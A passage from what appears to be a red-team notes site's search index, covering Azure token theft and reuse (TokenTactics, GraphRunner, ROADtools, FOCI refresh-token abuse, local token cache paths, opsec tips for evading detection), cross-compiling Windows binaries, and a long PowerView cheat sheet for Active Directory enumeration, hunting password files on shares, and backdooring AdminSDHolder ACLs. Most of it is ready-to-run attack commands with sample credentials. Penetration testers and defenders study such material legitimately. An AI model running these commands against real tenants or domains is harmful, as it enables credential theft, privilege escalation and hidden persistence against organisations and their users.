Write tokens to <code>$MSGraphToken</code> access: <code>$MSGraphToken.access_token</code></p> <p>Pillage MSTeams: [[Cloud/data_pillaging#MSTeams|data_pillaging]]</p> <p>[!NOTE] Opsec TokenTactics uses hyper specific user agents and should be modified for stealth</p> <p>[!NOTE] Opsec TokenTactics will let you pass <code>-Device</code> or <code>-Browser</code> to better blend in</p>"},{"location":"Azure/Tokens/get_tokens/#get-tokens-from-valid-auth","title":"Get tokens from valid auth.","text":"<p>ROADTools https://github.com/dirkjanm/ROADtools <pre><code>roadrecon auth -u \"Lindsey.Miller@megabigtech.com\" -p 'SUmmer07!!'\n</code></pre></p> <p>GraphRunner https://github.com/dafthack/GraphRunner/ <pre><code>. .\\GraphRunner.ps1\nGet-GraphTokens -UserPasswordAuth\n</code></pre> Also, use refresh token to grab new access tokens <pre><code>Invoke-RefreshGraphTokens\n</code></pre></p>"},{"location":"Azure/Tokens/priv_esc_FOCI_tokens/","title":"priv esc FOCI tokens","text":"<p>https://github.com/secureworks/family-of-client-ids-research/tree/main \"Refresh tokens are bound to a combination of user and client, but aren't tied to a resource or tenant. A client can use a refresh token to acquire access tokens across any combination of resource and tenant where it has permission to do so. Refresh tokens are encrypted and only the Microsoft identity platform can read them.\" </p> <p>It\u2019s possible with any refresh tokens from the Microsoft identity platform (Microsoft Entra accounts, Microsoft personal accounts, and social accounts like Facebook and Google) to request access tokens for other resources, scopes and even tenants.</p>"},{"location":"Azure/Tokens/tokens_info/","title":"Tokens info","text":""},{"location":"Azure/Tokens/tokens_info/#info","title":"Info","text":""},{"location":"Azure/Tokens/tokens_info/#token-types","title":"Token types","text":"<p>Access tokens: grant access to a specific resource. They act as authorization not authentication (JWT: <code>ey....</code>)</p> <p>Refresh token:  Used to obtain new access tokens when your access token expires. (start with <code>0.A</code> or <code>1.A</code>)</p> <p>ARM Access Tokens: used to authenticate and autorize requests to auzre managmenet layer. they're normally used through Azure portal, ARM API, Azure CLI or AZ Powershell.     - audL: <code>managment.azure.com</code></p> <p>Azure AD (AAD) Graph Tokens: Used to auth requests to the Azure AD Graph API. AAD graph is deprecated and it prolly dead :(      - aud: <code>graph.windows.net</code></p> <p>Microsoft Graph Tokens: Used for microosft graph api, a unified endpoint for accessing data, intel, and insights from msft cloud. This includes Entra (Azure AD). O365, Enterprise Mobility + Security (EMS), and WIndows 10.      - aud: <code>graph.microsoft.com</code></p> <p>Claims: - aud (audience) will tell you what the token was issued to grant access over.</p>"},{"location":"Azure/Tokens/tokens_info/#family-client-of-ids-foci","title":"Family Client of IDs (FOCI)","text":"<p>Family Refresh Tokens (FRTs) can be exchanged for bearer tokens to access any application in teh FOCI. These apps share the same familyID and are registered by the same publisher in Entra.</p>"},{"location":"Azure/Tokens/using_tokens/","title":"Using tokens","text":""},{"location":"Azure/Tokens/using_tokens/#authenticate-with-access-tokens","title":"Authenticate with Access Tokens","text":"<p>Azure PowerShell (Az Module)</p> <pre><code>$accesstoken = \"&lt;YOUR-ACCESS-TOKEN&gt;\"\n$accountid = \"is required but not validated\"\nConnect-AzAccount -AccessToken $accesstoken -AccountId $accountid\n</code></pre> <p>Validate connection: <pre><code>Get-AzContext\nGet-AzResource\n</code></pre></p> <p>Azure CLI</p> <p>[!NOTE] Note Azure CLI doesn't natively support direct access token authentication. Use REST API calls or convert to refresh token first.</p> <p>With access token via REST API: <pre><code>curl -H \"Authorization: Bearer &lt;ACCESS-TOKEN&gt;\" \\\n  \"https://management.azure.com/subscriptions?api-version=2020-01-01\"\n</code></pre></p> <p>Microsoft Graph PowerShell</p> <pre><code>$accesstoken = \"&lt;YOUR-GRAPH-TOKEN&gt;\"\nConnect-MgGraph -AccessToken $accesstoken\n</code></pre> <p>Validate: <pre><code>Get-MgContext\n</code></pre></p> <p>AADInternals https://github.com/Gerenios/AADInternals</p> <pre><code>Import-Module AADInternals\n$at = \"&lt;YOUR-ACCESS-TOKEN&gt;\"\nGet-AADIntAccessTokenForAADGraph -AccessToken $at\n</code></pre> <p>Direct API calls with cURL</p> <p>Azure Management API: <pre><code>curl -H \"Authorization: Bearer &lt;ACCESS-TOKEN&gt;\" \\\n  \"https://management.azure.com/subscriptions?api-version=2020-01-01\"\n</code></pre></p> <p>Microsoft Graph API: <pre><code>curl -H \"Authorization: Bearer &lt;ACCESS-TOKEN&gt;\" \\\n  \"https://graph.microsoft.com/v1.0/me\"\n</code></pre></p> <p>Azure Key Vault: <pre><code>curl -H \"Authorization: Bearer &lt;VAULT-TOKEN&gt;\" \\\n  \"https://&lt;vault-name&gt;.vault.azure.net/secrets?api-version=7.1\"\n</code></pre></p> <p>PowerShell Invoke-RestMethod</p> <pre><code>$accessToken = \"&lt;YOUR-ACCESS-TOKEN&gt;\"\n$headers = @{\n    'Authorization' = \"Bearer $accessToken\"\n    'Content-Type' = 'application/json'\n}\n$uri = \"https://graph.microsoft.com/v1.0/me\"\nInvoke-RestMethod -Uri $uri -Method Get -Headers $headers\n</code></pre>"},{"location":"Azure/Tokens/using_tokens/#authenticate-with-refresh-tokens","title":"Authenticate with Refresh Tokens","text":"<p>TokenTactics https://github.com/f-bader/TokenTacticsV2</p> <p>Convert refresh token to access token: <pre><code>Import-Module ./TokenTactics.psm1\n\n# Get ARM token\nRefreshTo-AzureManagementToken -domain domain.com -RefreshToken '&lt;REFRESH-TOKEN&gt;'\n\n# Get Graph token  \nRefreshTo-MSGraphToken -domain domain.com -RefreshToken '&lt;REFRESH-TOKEN&gt;'\n\n# Get MSTeams token\nRefreshTo-MSTeamsToken -domain domain.com -RefreshToken '&lt;REFRESH-TOKEN&gt;'\n\n# Get Substrate token\nRefreshTo-SubstrateToken -domain domain.com -RefreshToken '&lt;REFRESH-TOKEN&gt;'\n\n# Get Outlook token\nRefreshTo-OutlookToken -domain domain.com -RefreshToken '&lt;REFRESH-TOKEN&gt;'\n</code></pre></p> <p>Access tokens: <pre><code>$MSGraphToken.access_token\n$AzureManagementToken.access_token\n</code></pre></p> <p>[!NOTE] Opsec TokenTactics uses specific user agents. Use <code>-Device</code> or <code>-Browser</code> flags to blend in better</p> <p>AADInternals</p> <pre><code>Import-Module AADInternals\n\n$RefreshToken = \"&lt;REFRESH-TOKEN&gt;\"\n\n# Get access token for specific resource\nGet-AADIntAccessTokenForAADGraph -RefreshToken $RefreshToken\nGet-AADIntAccessTokenForAzureCoreManagement -RefreshToken $RefreshToken  \nGet-AADIntAccessTokenForMSGraph -RefreshToken $RefreshToken\n</code></pre> <p>GraphRunner https://github.com/dafthack/GraphRunner</p> <pre><code>Import-Module .\\GraphRunner.ps1\n\n# Use refresh token to get new tokens\nInvoke-RefreshGraphTokens -RefreshToken '&lt;REFRESH-TOKEN&gt;'\n</code></pre> <p>ROADTools https://github.com/dirkjanm/ROADtools</p> <pre><code># Get tokens with credentials first\nroadrecon auth -u \"user@domain.com\" -p 'Password123'\n\n# Refresh token stored in .roadtools_auth for reuse\nroadrecon auth --refresh-token &lt;REFRESH-TOKEN&gt;\n</code></pre>"},{"location":"Azure/Tokens/using_tokens/#using-both-access-refresh-tokens","title":"Using Both Access + Refresh Tokens","text":"<p>Save Azure context for persistence</p> <pre><code># Authenticate with access token\nConnect-AzAccount -AccessToken $accesstoken -AccountId \"user@domain.com\"\n\n# Save entire context (includes tokens)\nSave-AzContext -Path ./azure_context.json\n\n# Restore context later\nImport-AzContext -Path ./azure_context.json\n</code></pre> <p>TokenTactics token refresh workflow</p> <pre><code># Initial auth with refresh token\nRefreshTo-MSGraphToken -domain domain.com -RefreshToken '&lt;REFRESH-TOKEN&gt;'\n\n# Use access token  \n$headers = @{ 'Authorization' = \"Bearer $($MSGraphToken.access_token)\" }\n\n# When access token expires, refresh again\nInvoke-RefreshToMSGraphToken -domain domain.com -RefreshToken '&lt;REFRESH-TOKEN&gt;'\n</code></pre> <p>AADInternals session management</p> <pre><code># Get initial tokens\n$tokens = Get-AADIntAccessTokenForAADGraph -RefreshToken $RefreshToken\n\n# Parse tokens\n$AccessToken = $tokens[0]\n$RefreshToken = $tokens[1]\n\n# Use access token for operations\nGet-AADIntUsers -AccessToken $AccessToken\n\n# Refresh when needed\n$newTokens = Get-AADIntAccessTokenForAADGraph -RefreshToken $RefreshToken\n</code></pre>"},{"location":"Azure/Tokens/using_tokens/#token-audience-mapping","title":"Token Audience Mapping","text":"<p>Make sure your access token's <code>aud</code> claim matches the resource:</p> Resource Audience (aud) Use Case Azure Management <code>https://management.azure.com</code> ARM API, subscriptions, resources Microsoft Graph <code>https://graph.microsoft.com</code> Users, groups, mail, teams Azure AD Graph <code>https://graph.windows.net</code> Legacy Azure AD (deprecated) Key Vault <code>https://vault.azure.net</code> Secrets, keys, certificates Storage <code>https://storage.azure.com</code> Blob, queue, table storage Office 365 <code>https://outlook.office365.com</code> Exchange, mailboxes"},{"location":"Azure/Tokens/using_tokens/#foci-token-abuse","title":"FOCI Token Abuse","text":"<p>If you have a refresh token from a FOCI (Family of Client IDs) app, you can exchange it for access to ANY app in the family.</p> <p>TokenTactics FOCI support</p> <pre><code># Refresh token from one FOCI app can access others\nRefreshTo-MSGraphToken -domain domain.com -RefreshToken '&lt;FOCI-REFRESH-TOKEN&gt;'\nRefreshTo-AzureManagementToken -domain domain.com -RefreshToken '&lt;SAME-FOCI-TOKEN&gt;'\nRefreshTo-MSTeamsToken -domain domain.com -RefreshToken '&lt;SAME-FOCI-TOKEN&gt;'\n</code></pre> <p>Common FOCI apps: - Microsoft Teams - Microsoft Office - Azure PowerShell - Azure CLI - Microsoft Graph PowerShell</p>"},{"location":"Azure/Tokens/using_tokens/#decode-inspect-tokens","title":"Decode &amp; Inspect Tokens","text":"<p>PowerShell JWT decode</p> <pre><code>function Parse-JWTtoken {\n    param([string]$token)\n    $tokenPayload = $token.Split(\".\")[1].Replace('-', '+').Replace('_', '/')\n    while ($tokenPayload.Length % 4) { $tokenPayload += \"=\" }\n    $bytes = [System.Convert]::FromBase64String($tokenPayload)\n    $json = [System.Text.Encoding]::ASCII.GetString($bytes)\n    $json | ConvertFrom-Json\n}\n\nParse-JWTtoken -token \"&lt;YOUR-TOKEN&gt;\"\n</code></pre> <p>Online decoder (opsec warning) - jwt.io (sends token to external site)</p> <p>Check token validity</p> <pre><code># Graph token\ncurl -H \"Authorization: Bearer &lt;TOKEN&gt;\" https://graph.microsoft.com/v1.0/me\n\n# ARM token  \ncurl -H \"Authorization: Bearer &lt;TOKEN&gt;\" \\\n  https://management.azure.com/subscriptions?api-version=2020-01-01\n</code></pre>"},{"location":"Azure/Tokens/using_tokens/#extract-tokens-from-azure-clipowershell","title":"Extract Tokens from Azure CLI/PowerShell","text":"<p>See: [[get_tokens]] for full extraction methods</p> <p>Quick token extraction</p> <p>Azure CLI: <pre><code>az account get-access-token --resource \"https://management.azure.com\" | jq -r '.accessToken'\naz account get-access-token --resource \"https://graph.microsoft.com\" | jq -r '.accessToken'\n</code></pre></p> <p>PowerShell: <pre><code>(Get-AzAccessToken -ResourceUrl \"https://management.azure.com\").Token\n(Get-AzAccessToken -ResourceUrl \"https://graph.microsoft.com\").Token\n</code></pre></p> <p>Token cache locations</p> <p>Linux/Mac: <pre><code>~/.azure/msal_token_cache.json\n~/.Azure/msal_token_cache.json\n</code></pre></p> <p>Windows: <pre><code>C:\\Users\\&lt;user&gt;\\.Azure\\accessTokens.json\nC:\\Users\\&lt;user&gt;\\.azure\\msal_token_cache.bin\n</code></pre></p>"},{"location":"Cheatsheets/Compiling%20Binaries/","title":"Compiling Binaries","text":""},{"location":"Cheatsheets/Compiling%20Binaries/#linux-target","title":"Linux Target","text":"<p>Basic C <pre><code>gcc source.c -o myprog\n</code></pre></p>"},{"location":"Cheatsheets/Compiling%20Binaries/#windows-target","title":"Windows Target","text":"<p><pre><code>sudo apt install mingw-w64\n</code></pre> Basic C Compilation 32-bit \u201cHello World\u201d (console) <pre><code>i686-w64-mingw32-gcc -O2 -Wall hello.c -o hello32.exe\n</code></pre> 64-bit \u201cHello World\u201d (console) <pre><code>x86_64-w64-mingw32-gcc -O2 -Wall hello.c -o hello64.exe\n</code></pre> Basic C++ Compilation 32-bit C++ (console) <pre><code>i686-w64-mingw32-g++ -O2 -std=c++17 -Wall hello.cpp -o hello32.exe\n</code></pre> 64-bit C++ (console) <pre><code>x86_64-w64-mingw32-g++ -O2 -std=c++17 -Wall hello.cpp -o hello64.exe\n</code></pre> Setting Windows Version Macros To target a minimum Windows version, define <code>_WIN32_WINNT</code> and <code>WINVER</code>: <pre><code># Example: target Windows 7 (0x0601)\nx86_64-w64-mingw32-gcc -D_WIN32_WINNT=0x0601 -DWINVER=0x0601 hello.c -o hello.exe\n</code></pre> Common <code>_WIN32_WINNT</code> values:</p> <ul> <li><code>0x0501</code> \u2192 Windows XP</li> <li><code>0x0600</code> \u2192 Windows Vista</li> <li><code>0x0601</code> \u2192 Windows 7    </li> <li><code>0x0602</code> \u2192 Windows 8</li> <li><code>0x0A00</code> \u2192 Windows 10</li> </ul>"},{"location":"Cheatsheets/Compiling%20Binaries/#net-excutables","title":".NET Excutables","text":"<p><pre><code>sudo apt install -y mono-devel mono-mkbundle\n</code></pre> <pre><code>sudo apt install -y gcc-mingw-w64-x86-64\nsudo apt install -y gcc-mingw-w64-i6\n</code></pre> Compile to a portable .NET EXE (IL-only) using Mono\u2019s C# compiler (<code>mcs</code>): <pre><code>mcs -out:Hello.exe Hello.cs\n</code></pre> Basic 64-bit Windows EXE <pre><code>mkbundle \\\n  --cross mono-w64 --simple \\\n  --static \\\n  --deps \\\n  -o Hello_native.exe \\\n  Hello.exe\n</code></pre> For 32-bit Windows (Win32) <pre><code>mkbundle \\\n  --cross mono-w64-i686 \\\n  --simple \\\n  --static \\\n  --deps \\\n  -o Hello_native32.exe \\\n  Hello.exe\n</code></pre></p>"},{"location":"Cheatsheets/Compiling%20Binaries/#csproj","title":".csproj","text":"<p><pre><code>wget https://packages.microsoft.com/config/ubuntu/22.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb\nsudo dpkg -i packages-microsoft-prod.deb\nsudo apt update\nsudo apt install -y dotnet-sdk-7.0\n</code></pre> <pre><code>dotnet --info\n</code></pre> Ensure there\u2019s a <code>YourProject.csproj</code> in that directory (or a parent directory). Restore dependencies <pre><code>dotnet restore\n</code></pre> Build <pre><code>dotnet build -c Release\n</code></pre></p> <ul> <li>By default, the output goes into <code>bin/Release/&lt;TargetFramework&gt;/</code></li> <li>If you want to target a specific runtime (e.g. Windows), use: Target runtime <pre><code>dotnet publish -c Release -r win-x64 --self-contained false\n</code></pre></li> </ul>"},{"location":"Cheatsheets/Default%20Credentials/","title":"Default Credentials","text":"<p>CLI tool with default creds database: <pre><code>pip3 install defaultcreds-cheat-sheet --break-system-packages\n</code></pre></p> <pre><code>creds search tomcat\n</code></pre> <p></p>"},{"location":"Cheatsheets/Misc/","title":"Misc","text":""},{"location":"Cheatsheets/Misc/#how-to-passthrugh-usb-devices-virtualbox","title":"How to passthrugh USB devices VirtualBox","text":"<ol> <li>Extension pack and VirtualBox versions must match. The former can be found via File &gt; Preferences &gt; Extensions and the latter via Help &gt; About.</li> <li>USB Controller must be enabled in the VM configuration options.</li> <li>VBox Guest Additions must be installed on the guest VM. With the VM running, click Devices &gt; Insert Guest Additions CD Image and run the VBoxWindowsAdditions executable.</li> <li>The user running VirtualBox must be in the vboxusers group. At the command line, run <code>groups</code> to see what groups you are a member of. If vboxusers isn't in the list, run <code>sudo gpasswd -a $USER vboxusers</code> to add yourself then REBOOT.</li> <li>At least one filter must be set up under Devices &gt; USB &gt; USB Settings. Clicking the top icon on the right (USB plug with solid blue dot) will create a 'universal' filter for any device. When the VM is running, you should now see a list when you go to Devices &gt; USB that allows you to select devices to connect.</li> </ol>"},{"location":"Cheatsheets/Misc/#new-note-structure","title":"New note structure","text":"<p>Add cleanup considerations for EVERYTHING Add detection considerations for EVERYTHING</p>"},{"location":"Cheatsheets/Network%20Recon/","title":"Network Recon","text":""},{"location":"Cheatsheets/Network%20Recon/#internals","title":"Internals","text":"<p>Ports to check </p>"},{"location":"Cheatsheets/Passive%20Network%20Recon/","title":"Passive Network Recon","text":""},{"location":"Cheatsheets/Passive%20Network%20Recon/#host-discovery","title":"Host discovery","text":""},{"location":"Cheatsheets/Passive%20Network%20Recon/#dhcp","title":"DHCP","text":"<p>dhcpdump <pre><code>sudo dhcpdump -i eth0\n</code></pre> zeek <pre><code>sudo zeek -i eth0 local\n</code></pre></p>"},{"location":"Cheatsheets/Passive%20Network%20Recon/#arp","title":"ARP","text":"<p>tcpdump <pre><code>sudo tcpdump -n -i eth0 arp\n</code></pre></p>"},{"location":"Cheatsheets/PowerView/","title":"PowerView","text":"<p>Load, help, and creds - Import PowerView into the current session. <pre><code>Import-Module .\\PowerView.ps1\n</code></pre> - Show detailed help for a function. <pre><code>Get-Help Get-DomainUser -Detailed\n</code></pre> - Build an alternate credential object for any PowerView function. <pre><code>$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a',$SecPassword)\n</code></pre> - Test using alternate creds with a domain query. <pre><code>Get-DomainUser -Credential $Cred\n</code></pre></p> <p>Domain, forest, DCs, sites - Query info about the current domain. <pre><code>Get-Domain\n</code></pre> - Query info about a specified (child) domain. <pre><code>Get-Domain -Domain child.corp.local\n</code></pre> - List domain controllers for the current domain. <pre><code>Get-DomainController\n</code></pre> - Get forest-level information. <pre><code>Get-Forest\n</code></pre> - List all domains in the forest. <pre><code>Get-ForestDomain\n</code></pre> - List forest trusts. <pre><code>Get-ForestTrust\n</code></pre> - List domain trusts (like nltest /trusted_domains). <pre><code>Get-DomainTrust\n</code></pre> - Recursively map reachable domain trusts. <pre><code>Get-DomainTrustMapping\n</code></pre> - Enumerate AD sites. <pre><code>Get-DomainSite\n</code></pre> - Enumerate AD subnets. <pre><code>Get-DomainSubnet\n</code></pre> - List global catalog servers in the forest. <pre><code>Get-ForestGlobalCatalog\n</code></pre></p> <p>Policy (password/Kerberos) - Read Kerberos policy from domain policy. <pre><code>(Get-DomainPolicy -Domain corp.local).KerberosPolicy\n</code></pre> - Read password/lockout policy (SystemAccess) from domain policy. <pre><code>(Get-DomainPolicy -Domain corp.local).SystemAccess\n</code></pre></p> <p>Users (filters, UAC, SPN/AS-REP) - Enumerate users with useful props (UPN, enabled, last logon). <pre><code>Get-DomainUser -Properties samaccountname,UserPrincipalName,Enabled,lastlogontimestamp\n</code></pre> - Users with passwords not changed in &gt;1 year. <pre><code>$Date=(Get-Date).AddYears(-1).ToFileTime(); Get-DomainUser -LDAPFilter \"(pwdlastset&lt;=$Date)\" -Properties samaccountname,pwdlastset\n</code></pre> - All enabled users (DNs). <pre><code>Get-DomainUser -LDAPFilter \"(!userAccountControl:1.2.840.113556.1.4.803:=2)\" -Properties distinguishedname\n</code></pre> - Enabled users via UAC helper. <pre><code>Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname\n</code></pre> - All disabled users (LDAP filter). <pre><code>Get-DomainUser -LDAPFilter \"(useraccountcontrol:1.2.840.113556.1.4.803:=2)\"\n</code></pre> - All disabled users (UAC helper). <pre><code>Get-DomainUser -UACFilter ACCOUNTDISABLE\n</code></pre> - Users requiring smart card auth (LDAP filter). <pre><code>Get-DomainUser -LDAPFilter \"(useraccountcontrol:1.2.840.113556.1.4.803:=262144)\"\n</code></pre> - Users requiring smart card (UAC helper). <pre><code>Get-DomainUser -UACFilter SMARTCARD_REQUIRED\n</code></pre> - Users NOT requiring smart card (list samaccountname only). <pre><code>Get-DomainUser -LDAPFilter \"(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)\" -Properties samaccountname\n</code></pre> - Service accounts (users with SPNs). <pre><code>Get-DomainUser -SPN\n</code></pre> - AS-REP roastable users (no Kerberos preauth). <pre><code>Get-DomainUser -PreauthNotRequired\n</code></pre> - AS-REP roastable via UAC helper. <pre><code>Get-DomainUser -UACFilter DONT_REQ_PREAUTH\n</code></pre> - Mix identity types (SID, DN, GUID, name) for user lookup. <pre><code>'S-1-5-21-890171859-3433809279-3366196753-1114','CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff\n</code></pre> - Users with sidHistory populated. <pre><code>Get-DomainUser -LDAPFilter '(sidHistory=*)' -Properties samaccountname,sidHistory\n</code></pre> - Service accounts that are (or were) in Domain Admins. <pre><code>Get-DomainUser -SPN | ? {$_.memberOf -match 'Domain Admins'}\n</code></pre></p> <p>Groups and membership - List groups with \u201cadmin\u201d in the name. <pre><code>Get-DomainGroup -Identity *admin* -Properties name,distinguishedname\n</code></pre> - List protected (AdminSDHolder) groups. <pre><code>Get-DomainGroup -AdminCount -Properties name\n</code></pre> - List groups that don\u2019t have a global scope. <pre><code>Get-DomainGroup -GroupScope NotGlobal -Properties name\n</code></pre> - List all groups a user/group effectively belongs to (tokenGroups). <pre><code>Get-DomainGroup -MemberIdentity jdoe\n</code></pre> - Same as above with a DN identity. <pre><code>Get-DomainGroup -MemberIdentity \"CN=dfm,CN=Users,DC=testlab,DC=local\"\n</code></pre> - Recursively enumerate group members of Domain Admins. <pre><code>Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\n</code></pre></p> <p>Foreign users/groups (cross-domain) - Find users from foreign domains present in this domain. <pre><code>Get-DomainForeignUser\n</code></pre> - Find groups in target domain that have foreign members. <pre><code>Get-DomainForeignGroupMember -Domain target.domain.com\n</code></pre> - List foreignSecurityPrincipals from the GC (for SID/DN correlation). <pre><code>Get-DomainObject -Properties objectsid,distinguishedname -SearchBase \"GC://corp.local\" -LDAPFilter '(objectclass=foreignSecurityPrincipal)'\n</code></pre></p> <p>Computers (targeting, delegation) - Inventory computers with helpful props. <pre><code>Get-DomainComputer -Properties name,dnshostname,operatingsystem,lastlogontimestamp\n</code></pre> - Filter by OS for servers. <pre><code>Get-DomainComputer -OperatingSystem \"*Server*\" -Properties name,operatingsystem\n</code></pre> - Computers allowing unconstrained delegation. <pre><code>Get-DomainComputer -Unconstrained\n</code></pre> - Computers trusted to authenticate for others (constrained delegation). <pre><code>Get-DomainComputer -TrustedToAuth\n</code></pre> - Computers with specific SPNs (e.g., SQL). <pre><code>Get-DomainComputer -SPN *SQL* -Properties name,serviceprincipalname\n</code></pre> - List computers from a specific OU. <pre><code>Get-DomainComputer -SearchBase \"LDAP://OU=Servers,DC=corp,DC=local\" -Properties dnshostname\n</code></pre></p> <p>Sessions, local groups, shares (who/where, not process list) - Enumerate SMB sessions on a remote host. <pre><code>Get-NetSession -ComputerName FS01.corp.local\n</code></pre> - Enumerate logged-on users on a host. <pre><code>Get-NetLoggedOn -ComputerName WS01.corp.local\n</code></pre> - Enumerate current RDP sessions (and source IPs). <pre><code>Get-NetRDPSession -ComputerName WS01.corp.local\n</code></pre> - List local groups on a host. <pre><code>Get-NetLocalGroup -ComputerName WS01\n</code></pre> - List members of a local group (default WinNT provider). <pre><code>Get-NetLocalGroupMember -ComputerName WS01 -GroupName \"Administrators\"\n</code></pre> - Faster local group member enumeration via Win32 API. <pre><code>Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local\n</code></pre> - Enumerate shares on a host. <pre><code>Get-NetShare -ComputerName SQL01\n</code></pre></p> <p>User hunting (old Invoke-UserHunter) - Show all user locations across domain (be noisy). <pre><code>Find-DomainUserLocation -ShowAll\n</code></pre> - Focus on unconstrained delegation computers and show users. <pre><code>Find-DomainUserLocation -ComputerUnconstrained -ShowAll\n</code></pre> - Hunt for admin users who allow delegation on unconstrained hosts. <pre><code>Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation\n</code></pre> - Hunt specific user and check if you have local admin where found. <pre><code>Find-DomainUserLocation -UserIdentity \"jdoe\" -CheckAccess\n</code></pre> - Get logged-on users for all \u201cserver\u201d OUs in a domain. <pre><code>Get-DomainOU -Identity *server* -Domain corp.local | % { Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | % { Get-NetLoggedOn -ComputerName $_.dnshostname } }\n</code></pre></p> <p>Shares and file discovery - Enumerate open shares domain-wide. <pre><code>Find-DomainShare\n</code></pre> - Enumerate only shares you can read. <pre><code>Find-DomainShare -CheckShareAccess\n</code></pre> - Search domain shares for interesting files (old Invoke-FileFinder). <pre><code>Find-InterestingDomainShareFile -Domain CORP\n</code></pre> - Same, with alternate credentials. <pre><code>$Password=\"PASSWORD\"|ConvertTo-SecureString -AsPlainText -Force; $Credential=New-Object System.Management.Automation.PSCredential(\"CORP\\user\",$Password); Find-InterestingDomainShareFile -Domain CORP -Credential $Credential\n</code></pre> - Recursively search a specific UNC path for keywords, Office docs, and last-access time. <pre><code>Find-InterestingFile -Path \\\\SERVER\\Share -Include password,creds,secret -OfficeDocs -LastAccessTime (Get-Date).AddDays(-7)\n</code></pre></p> <p>GPOs, GP links, access mapping - List all GPOs in the domain. <pre><code>Get-DomainGPO\n</code></pre> - List OUs and their GPO links. <pre><code>Get-DomainOU -GPLink | Select-Object Name,gplink\n</code></pre> - List policies applied to a specific computer. <pre><code>Get-DomainGPO -ComputerIdentity WS01.corp.local\n</code></pre> - Map where a user/group has local group rights via GPO (old Find-GPOLocation). <pre><code>Get-DomainGPOUserLocalGroupMapping -Identity \"CORP\\Helpdesk\"\n</code></pre> - Check RDP group mapping for a user in a domain. <pre><code>Get-DomainGPOUserLocalGroupMapping -Identity \"CORP\\user\" -Domain corp.local -LocalGroup RDP\n</code></pre> - Export a CSV of GPO mappings with flattened computer arrays. <pre><code>Get-DomainGPOUserLocalGroupMapping | % { $_.computers = ($_.computers -join \", \"); $_ } | Export-Csv -NoTypeInformation gpo_map.csv\n</code></pre></p> <p>Delegation reconnaissance - Users with constrained delegation configured. <pre><code>Get-DomainUser -TrustedToAuth\n</code></pre> - Computers with constrained delegation configured. <pre><code>Get-DomainComputer -TrustedToAuth\n</code></pre> - Admin-protected users who are allowed to be delegated (interesting). <pre><code>Get-DomainUser -AllowDelegation -AdminCount\n</code></pre></p> <p>ACLs, DCSync rights, AdminSDHolder, backdooring - Enumerate who has rights over a target object (resolve GUIDs). <pre><code>Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local\n</code></pre> - Grant \u201cwill\u201d the right to reset \u201cmatt\u201d\u2019s password. <pre><code>Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose\n</code></pre> - Read AdminSDHolder permissions (resolve GUIDs). <pre><code>Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs\n</code></pre> - Backdoor AdminSDHolder to grant \u201cmatt\u201d full rights to protected objects. <pre><code>Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All\n</code></pre> - Identify principals with replication (DCSync) or full control (domain DN path). <pre><code>Get-DomainObjectAcl \"dc=dev,dc=testlab,dc=local\" -ResolveGUIDs | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }\n</code></pre> - Alternative DCSync check using Get-ObjectACL alias/function. <pre><code>Get-ObjectACL \"DC=testlab,DC=local\" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get') }\n</code></pre></p> <p>GPP and GPP-linked computers - Recover any stored Group Policy Preferences passwords (legacy). <pre><code>Get-GPPPassword\n</code></pre> - Resolve all computer DNS hostnames where a given GPP/GPO applies by GUID. <pre><code>Get-DomainOU -GPLink '&lt;GPP_GUID&gt;' | % { Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname }\n</code></pre></p> <p>Interesting ACLs and shadow admins - Find interesting domain ACLs (write/owner/DACL rights) and resolve GUIDs. <pre><code>Find-InterestingDomainAcl -ResolveGUIDs\n</code></pre> - Flag GPOs where \u201cuser\u201d SIDs (&gt;1000) have modification/control rights. <pre><code>Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') }\n</code></pre></p> <p>OU, file servers, DNS - List organizational units. <pre><code>Get-DomainOU\n</code></pre> - Find likely file servers based on user home/profile/script paths. <pre><code>Get-DomainFileServer\n</code></pre> - Enumerate DNS records for a zone (if DNS partition accessible). <pre><code>Get-DomainDNSRecord -Zone corp.local\n</code></pre></p> <p>Trust-aware foreign membership walk - Pull foreignSecurityPrincipal DNs from GC for later correlation. <pre><code>$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase \"GC://testlab.local\" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\\d{2,}$'} | Select-Object -ExpandProperty distinguishedname\n</code></pre> - For each referenced domain, enumerate domain-local groups with those members. <pre><code>$Domains=@{}; ForEach($ForeignUser in $ForeignUsers){ $ForeignUserDomain=$ForeignUser.Substring($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'; if(-not $Domains[$ForeignUserDomain]){ $Domains[$ForeignUserDomain]=$True; $Filter=\"(|(member=\"+($ForeignUsers -join \")(member=\")+\"))\"; Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member } } | fl\n</code></pre></p> <p>User impersonation helpers (STA) - Temporarily impersonate a different credential (runas /netonly-like). <pre><code>$SecPassword = ConvertTo-SecureString 